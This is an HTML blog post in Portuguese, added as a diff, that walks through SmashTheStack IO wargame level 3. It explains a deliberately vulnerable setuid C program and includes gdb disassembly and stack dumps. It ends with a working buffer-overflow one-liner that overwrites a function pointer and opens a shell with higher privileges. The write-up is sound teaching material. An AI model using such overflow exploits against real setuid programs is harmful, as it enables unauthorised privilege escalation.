@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="">
+  <meta property="og:description" content="">
+  
+  <meta property="og:image" content="https://ferreirasc.github.io/post/smash_the_stack3/">
+  <meta property="og:image:type" content="image/jpg">
+  
+  <meta property="og:type" content="article">
+  <meta property="article:author" content="Leonardo Ferreira">
+  
+  <meta property="article:published_time" content="2016-01-03 01:07:23 -0400 -0400">
+  <meta property="fb:app_id" content="128539894229266"/>
+  <meta property="fb:admins" content="1234176778"/>
+  <meta name="generator" content="Hugo 0.53" />
+
+  <title>IO Smash The Stack - Level03 &middot; Leonardo Ferreira</title>
+
+  
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-old-ie-min.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+  <!--<![endif]-->
+
+  <!--[if lte IE 8]>
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/side-menu-old-ie.css">
+  <![endif]-->
+  <!--[if gt IE 8]><!-->
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/side-menu.css">
+  <!--<![endif]-->
+
+  <link rel="stylesheet" href="https://ferreirasc.github.io/css/blackburn.css">
+
+  
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
+
+  
+  <link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet" type="text/css">
+
+  
+  
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/styles/default.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.1.0/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+  
+  
+  <link rel="shortcut icon" href="https://ferreirasc.github.io/img/favicon.ico" type="image/x-icon" />
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    TeX: { equationNumbers: { autoNumber: "AMS" } }
+  });
+</script>
+  
+<script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\[','\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { 
+          equationNumbers: { autoNumber: "AMS" },
+          extensions: ["AMSmath.js", "AMSsymbols.js"] 
+      }
+    },
+    TeX: {
+      equationNumbers: { autoNumber: "AMS" } 
+    }
+});
+  MathJax.Hub.Queue(function() {
+  
+  
+  
+  var all = MathJax.Hub.getAllJax(), i;
+  for(i = 0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+  }
+});
+</script>
+
+</head>
+
+
+<body>
+<div id="layout">
+
+  
+<a href="#menu" id="menuLink" class="menu-link">
+  
+  <span></span>
+</a>
+<div id="menu">
+
+  
+  <a class="pure-menu-heading brand" href="https://ferreirasc.github.io/"> ferreirasc:~#</a>
+
+
+
+<a class="pure-menu-heading brand" href="https://ferreirasc.github.io/about"><img class="avatar" src="https://ferreirasc.github.io/avatar.jpg"/></a>
+
+
+
+  <div class="pure-menu">
+    <ul class="pure-menu-list">
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/"><i class='fa fa-home fa-fw'></i>Home</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/post/"><i class='fa fa-list fa-fw'></i>Posts</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/about/"><i class='fa fa-user fa-fw'></i>About Me</a>
+      
+        </li>
+      
+      
+        <li class="pure-menu-item">
+          <a class="pure-menu-link" href="https://ferreirasc.github.io/contact/"><i class='fa fa-phone fa-fw'></i>Contact</a>
+      
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="pure-menu social">
+  <ul class="pure-menu-list">
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://twitter.com/ferreirasc0" target="_blank"><i class="fa fa-twitter-square fa-fw"></i>Twitter</a>
+    </li>
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://facebook.com/ferreirasc" target="_blank"><i class="fa fa-facebook-square fa-fw"></i>Facebook</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://linkedin.com/in/ferreirasc" target="_blank"><i class="fa fa-linkedin-square fa-fw"></i>LinkedIn</a>
+    </li>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <li class="pure-menu-item">
+      <a class="pure-menu-link" href="https://github.com/ferreirasc" target="_blank"><i class="fa fa-github-square fa-fw"></i>GitHub</a>
+    </li>
+    
+
+    
+
+    
+
+  </ul>
+</div>
+
+
+  <div>
+  <div class="small-print">
+    <small>&copy; 2016. All rights reserved.</small>
+  </div>
+  <div class="small-print">
+    <small>Built with&nbsp;<a href="https://gohugo.io/" target="_blank">Hugo</a></small>
+    <small>Theme&nbsp;<a href="https://github.com/yoshiharuyamashita/blackburn" target="_blank">Blackburn</a></small>
+  </div>
+</div>
+
+</div>
+
+
+  <div id="main">
+
+
+<div class="header">
+  <h1>IO Smash The Stack - Level03</h1>
+  <h2></h2>
+</div>
+<div class="content">
+
+  <div class="post-meta">
+
+  <div>
+    <i class="fa fa-calendar fa-fw"></i>
+    <time>03 Jan 2016, 01:07</time>
+  </div>
+
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-folder fa-fw"></i>
+    
+      <a class="post-taxonomy-topic" href="https://ferreirasc.github.io/topics/wargames">Wargames</a>
+    
+  </div>
+  
+  
+
+  
+  
+  
+  <div>
+    <i class="fa fa-tags fa-fw"></i>
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.io/tags/wargame">Wargame</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.io/tags/smashthestack-i/o">SmashTheStack I/O</a>&nbsp;&#47;
+    
+      <a class="post-taxonomy-tag" href="https://ferreirasc.github.io/tags/hacking">Hacking</a>
+    
+  </div>
+  
+  
+  
+  
+  
+  <div>
+    <i class="fa fa-signal fa-fw"></i>
+      <a class="post-taxonomy-level" href="https://ferreirasc.github.io/level/basic">Basic</a>
+  </div>
+  
+  
+
+</div>
+
+
+  <p>Com o level 2 concluido, temos acesso ao servidor ssh do level03.</p>
+
+<p>No diretório “/levels”, vemos dois arquivos associados a esse level: level03 e level03.c.</p>
+
+<pre><code class="language-python">level3@io:/levels$ ls -la
+
+-r-sr-x---  1 level4  level3   5238 Sep 22  2012 level03
+
+-r--------  1 level3  level3    658 Sep 22  2012 level03.c
+</code></pre>
+
+<p>Um binário de 32-bits com SUID-bit ativo tendo privilégios de level04 (como era de se esperar…) e um código em C, level03.c.</p>
+
+<p>Vamos analisar o level03.c:</p>
+
+<pre><code class="language-C++">//bla, based on work by beach  
+#include &lt;stdio.h&gt;  
+#include &lt;string.h&gt;  
+void good()  
+{  
+ puts(&quot;Win.&quot;);  
+ execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);  
+}  
+void bad()  
+{  
+ printf(&quot;I'm so sorry, you're at %p and you want to be at %p\n&quot;, bad, good);  
+}  
+int main(int argc, char **argv, char **envp)  
+{  
+ void (*functionpointer)(void) = bad;  
+ char buffer[50];  
+ if(argc != 2 || strlen(argv[1]) &lt; 4)  
+     return 0;  
+ memcpy(buffer, argv[1], strlen(argv[1]));  
+ memset(buffer, 0, strlen(argv[1]) - 4);  
+ printf(&quot;This is exciting we're going to %p\n&quot;, functionpointer);  
+ functionpointer();  
+ return 0;  
+}  
+</code></pre>
+
+<p>Podemos notar que a função “good” é o goal desse level, já que ela invoca um execl(“/bin/sh”,“sh”,NULL) que nos daria acesso à um shell com privilégios do processo em execução, que como sabemos, é de level04.</p>
+
+<p>O código inicia com um ponteiro pra void, functionpointer, que aponta para o endereço de uma função denominada “bad”. É criado um buffer de 50 caracteres e é feito algumas verificações nos argumentos de entrada do programa (exigindo necessariamente 2 argumentos e uma string de pelo menos 4 caracteres no segundo argumento para que o programa não termine). Nada de interessante até aqui.</p>
+
+<p>Agora atentemos para essas duas linhas:</p>
+
+<pre><code class="language-C++">memcpy(buffer, argv[1], strlen(argv[1]));  
+memset(buffer, 0, strlen(argv[1]) - 4); 
+</code></pre>
+
+<p>A função void *memcpy(void *str1, const void *str2, size_t n) é uma conhecida função do C que basicamente copia n caracteres de uma área de memória str2 para uma área de memória str1. No caso do nosso código, estaríamos copiando <code>$strlen(argv[1])$</code> bytes, que é justamente o tamanho da string que passaremos como argumento na linha de comando, para dentro da variável buffer de 50 bytes.</p>
+
+<p>A função void *memset(void *str, int c, size_t n), por sua vez, copia o caracter associado ao inteiro c para os n primeiros caracteres da string apontada por str. No nosso código, estaríamos setando as 4 últimas posições de buffer com ‘0’.</p>
+
+<p>A grande questão a ser observada nessas duas linhas está no fato de que a função memcpy, na forma como foi usada, estará copiando para dentro da variável buffer (de tamanho limitado de 50 bytes) o tamanho da string que eu passar por argumento na linha de comando (<code>$strlen(argv[1])$</code>), que pode ser tão grande quanto eu queira. O código me permite, então, dar como entrada uma string que extrapolaria o tamanho de buffer e causaria o que chamamos de “estouro de buffer” ou “buffer overflow”.</p>
+
+<p>O código termina printando o endereço para onde functionpointer aponta e chama a função que functionpointer aponta. Numa execução normal, teríamos como saída:</p>
+
+<pre><code class="language-bash">level3@io:/levels$ ./level03 AAAAAAAAAAAAAA
+This is exciting we're going to 0x80484a4
+I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
+</code></pre>
+
+<p>Sendo 0x80484a4 o endereço de “bad” e 0x8048474 o endereço de “good”.</p>
+
+<p>Para continuar esse level, devemos nos lembrar de como a stack funciona. Sabemos que todo processo em execução é dividido em regiões bem definidas: texto, dados, BSS, regiões de memory mapping, stack e heap. A stack é um bloco de memória contíguo que é utilizado para armazenar as variáveis locais das funções de um programa, seus parâmetros, e também o retorno de cada função. Implementando a metodologia LIFO (Last In, First Out), funciona sob os comandos de PUSH (empilhar dado) e POP (desempilhar dado), tendo a característica de sempre crescer para endereços de memória mais baixos para cada PUSH. É de se esperar, então, que todos os parâmetros e variáveis das funções do nosso programa estarão empilhados na stack.</p>
+
+<p>É importante ressaltar também a importância de alguns registradores que são utilizados no funcionamento da stack:</p>
+
+<ul>
+<li>EBP: Armazena o endereço da base da stack.</li>
+<li>ESP: Aponta para o topo da pilha.</li>
+<li>EIP: Armazena o endereço da próxima instrução a ser executada.</li>
+</ul>
+
+<p>A stack do nosso programa teria os dados empilhados numa configuração como essa:</p>
+
+<pre><code>                &lt;----
+      (em bytes)
+    50         26               4            4      4     4     4     4
+| buffer | gcc padding | functionpointer | argc | argv | env | ebp | ret |
+      Endereços de memória mais alto
+                       ----&gt;
+</code></pre>
+
+<p>Diante dessas informações, nosso objetivo passa a ser de alguma forma alterar o valor do endereço apontado por functionpointer, que inicialmente aponta para “bad” (0x80484a4), e fazer com que esse ponteiro aponte para “good” (de endereço 0x8048474).</p>
+
+<p>A chave para esse level está na característica da função memcpy() copiar caracteres para o buffer em direção aos endereços mais altos de memória. O que podemos imaginar disso? Que poderemos com uma entrada grande suficiente causar um buffer overflow para sobrescrever o buffer e mais alguns extra paddings com o objetivo de chegar ao endereço apontado por functionpointer!</p>
+
+<p>Vamos analisar isso pelo gdb:</p>
+
+<pre><code class="language-bash"> level3@io:/levels$ gdb -q level03  
+ Reading symbols from /levels/level03...(no debugging symbols found)...done.  
+ (gdb) disas main  
+ Dump of assembler code for function main:  
+   0x080484c8 &lt;+0&gt;:     push  %ebp  
+   0x080484c9 &lt;+1&gt;:     mov  %esp,%ebp  
+   0x080484cb &lt;+3&gt;:     sub  $0x78,%esp  
+   0x080484ce &lt;+6&gt;:     and  $0xfffffff0,%esp  
+   0x080484d1 &lt;+9&gt;:     mov  $0x0,%eax  
+   0x080484d6 &lt;+14&gt;:     sub  %eax,%esp  
+   0x080484d8 &lt;+16&gt;:     movl  $0x80484a4,-0xc(%ebp)  
+   0x080484df &lt;+23&gt;:     cmpl  $0x2,0x8(%ebp)  
+   0x080484e3 &lt;+27&gt;:     jne  0x80484fc &lt;main+52&gt;  
+   0x080484e5 &lt;+29&gt;:     mov  0xc(%ebp),%eax  
+   0x080484e8 &lt;+32&gt;:     add  $0x4,%eax  
+   0x080484eb &lt;+35&gt;:     mov  (%eax),%eax  
+   0x080484ed &lt;+37&gt;:     mov  %eax,(%esp)  
+   0x080484f0 &lt;+40&gt;:     call  0x804839c &lt;strlen@plt&gt;  
+   0x080484f5 &lt;+45&gt;:     cmp  $0x3,%eax  
+   0x080484f8 &lt;+48&gt;:     jbe  0x80484fc &lt;main+52&gt;  
+   0x080484fa &lt;+50&gt;:     jmp  0x8048505 &lt;main+61&gt;  
+   0x080484fc &lt;+52&gt;:     movl  $0x0,-0x5c(%ebp)  
+   0x08048503 &lt;+59&gt;:     jmp  0x8048579 &lt;main+177&gt;  
+   0x08048505 &lt;+61&gt;:     mov  0xc(%ebp),%eax  
+   0x08048508 &lt;+64&gt;:     add  $0x4,%eax  
+   0x0804850b &lt;+67&gt;:     mov  (%eax),%eax  
+   0x0804850d &lt;+69&gt;:     mov  %eax,(%esp)  
+   0x08048510 &lt;+72&gt;:     call  0x804839c &lt;strlen@plt&gt;  
+   0x08048515 &lt;+77&gt;:     mov  %eax,0x8(%esp)  
+   0x08048519 &lt;+81&gt;:     mov  0xc(%ebp),%eax  
+   0x0804851c &lt;+84&gt;:     add  $0x4,%eax  
+   0x0804851f &lt;+87&gt;:     mov  (%eax),%eax  
+   0x08048521 &lt;+89&gt;:     mov  %eax,0x4(%esp)  
+   0x08048525 &lt;+93&gt;:     lea  -0x58(%ebp),%eax  
+   0x08048528 &lt;+96&gt;:     mov  %eax,(%esp)  
+   0x0804852b &lt;+99&gt;:     call  0x804838c &lt;memcpy@plt&gt;  
+   0x08048530 &lt;+104&gt;:     mov  0xc(%ebp),%eax  
+   0x08048533 &lt;+107&gt;:     add  $0x4,%eax  
+   0x08048536 &lt;+110&gt;:     mov  (%eax),%eax  
+   0x08048538 &lt;+112&gt;:     mov  %eax,(%esp)  
+   0x0804853b &lt;+115&gt;:     call  0x804839c &lt;strlen@plt&gt;  
+   0x08048540 &lt;+120&gt;:     sub  $0x4,%eax  
+   0x08048543 &lt;+123&gt;:     mov  %eax,0x8(%esp)  
+   0x08048547 &lt;+127&gt;:     movl  $0x0,0x4(%esp)  
+   0x0804854f &lt;+135&gt;:     lea  -0x58(%ebp),%eax  
+   0x08048552 &lt;+138&gt;:     mov  %eax,(%esp)  
+   0x08048555 &lt;+141&gt;:     call  0x804835c &lt;memset@plt&gt;  
+   0x0804855a &lt;+146&gt;:     mov  -0xc(%ebp),%eax  
+   0x0804855d &lt;+149&gt;:     mov  %eax,0x4(%esp)  
+   0x08048561 &lt;+153&gt;:     movl  $0x80486c0,(%esp)  
+   0x08048568 &lt;+160&gt;:     call  0x80483ac &lt;printf@plt&gt;  
+   0x0804856d &lt;+165&gt;:     mov  -0xc(%ebp),%eax  
+   0x08048570 &lt;+168&gt;:     call  *%eax  
+   0x08048572 &lt;+170&gt;:     movl  $0x0,-0x5c(%ebp)  
+   0x08048579 &lt;+177&gt;:     mov  -0x5c(%ebp),%eax  
+   0x0804857c &lt;+180&gt;:     leave   
+   0x0804857d &lt;+181&gt;:     ret    
+ End of assembler dump. 
+</code></pre>
+
+<p>Podemos ver claramente uma call de memcpy() em 0x0804852b. É ali que minha string passada como parâmetro vai ser copiada para dentro de buffer.</p>
+
+<p>Dando um break imediatamente após a cópia desses valores por memcpy(), rodando o programa com uma string “BBBB” e analisando a stack partindo de seu topo (%esp)…</p>
+
+<pre><code class="language-bash"> (gdb) b *0x08048530  
+ Breakpoint 1 at 0x8048530  
+ (gdb) r BBBB  
+ Starting program: /levels/level03 BBBB  
+ Breakpoint 1, 0x08048530 in main ()  
+ (gdb) x/28x $esp  
+ 0xbffffc40:     0xbffffc60     0xbffffe8b     0x00000004     0x00000001  
+ 0xbffffc50:     0xb7fff908     0xbffffc86     0xbffffc90     0xb7ef19dc  
+ 0xbffffc60:     0x42424242     0xb7e9e5f5     0xbffffc87     0x00000001  
+ 0xbffffc70:     0x00000000     0x080497c8     0xbffffc88     0x08048338  
+ 0xbffffc80:     0xb7ff0590     0x080497c8     0xbffffcb8     0x080485a9  
+ 0xbffffc90:     0xb7fcf324     0xb7fceff4     0x08048590     0xbffffcb8  
+ 0xbffffca0:     0xb7e9e7f5     0xb7ff0590     0x0804859b     0x080484a4  
+</code></pre>
+
+<p>Temos que nosso buffer inicia em <strong>0xbffffc60</strong>, já que encontramos o valor <strong>0x42424242</strong> que correspondem aos 4 bytes “BBBB” que demos como entrada (perceba que 42 corresponde a letra ‘B’ em hexadecimal). Além disso, podemos enxergar também o valor de functionpointer em <strong>0xbffffcaf</strong>, que armazena o valor 0x80484a4, correspondente a função “bad”.</p>
+
+<p>A próximo passo agora é utilizar do stack-based buffer overflow para sobrescrever esses paddings até o conteúdo de functionpointer, e aí, então, modificar seu conteúdo pelo endereço de “good”:</p>
+
+<pre><code class="language-bash">level3@io:/levels$ ./level03 `perl -e 'print &quot;B&quot;x76,&quot;\x74\x84\x04\x08&quot;'`  
+This is exciting we're going to 0x8048474  
+Win.  
+sh-4.2$ 
+</code></pre>
+
+<p>Agora teremos acesso à um shell com privilégios de &ldquo;level4&rdquo;. o/</p>
+
+<hr><br>
+  
+  
+  <small><i class="fa fa-lightbulb-o" aria-hidden="true"></i> Last modified: January 3, 2016</small>  
+</hr>
+
+  
+<div class="prev-next-post pure-g">
+  <div class="pure-u-1-24" style="text-align: left;">
+    
+    <a href="https://ferreirasc.github.io/post/smash_the_stack2/"><i class="fa fa-chevron-left"></i></a>
+    
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="prev">
+      <a href="https://ferreirasc.github.io/post/smash_the_stack2/">IO Smash The Stack - Level02</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-2-24">
+    &nbsp;
+  </div>
+  <div class="pure-u-10-24">
+    
+    <nav class="next">
+      <a href="https://ferreirasc.github.io/post/spoj_cardapio/">O problema da satisfatibilidade booleana (SAT)</a>
+    </nav>
+    
+  </div>
+  <div class="pure-u-1-24" style="text-align: right;">
+    
+    <a href="https://ferreirasc.github.io/post/spoj_cardapio/"><i class="fa fa-chevron-right"></i></a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+
+(function() {
+    
+    
+    if (window.location.hostname == "localhost")
+        return;
+
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+    var disqus_shortname = 'ferreirasc';
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+</div>
+
+</div>
+</div>
+<script src="https://ferreirasc.github.io/js/ui.js"></script>
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-77924066-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+</body>
+</html>
+
